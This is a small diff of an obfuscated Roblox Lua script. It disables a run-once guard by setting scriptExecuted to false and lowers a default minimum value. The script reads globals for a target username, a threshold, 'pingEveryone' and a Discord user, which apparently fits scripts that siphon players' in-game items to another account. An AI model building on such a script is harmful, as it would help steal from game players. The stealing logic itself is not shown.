@@ -8,9 +8,9 @@ _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
 else
-    _G.scriptExecuted = true
+    _G.scriptExecuted = false
     local vu1 = _G.Username or ""
-    local v2 = _G.min_value or 1.0
+    local v2 = _G.min_value or 0.1
     local v3 = _G.pingEveryone or "No"
     local vu4 = _G.discuser or ""
     local vu5 = game:GetService("Players")
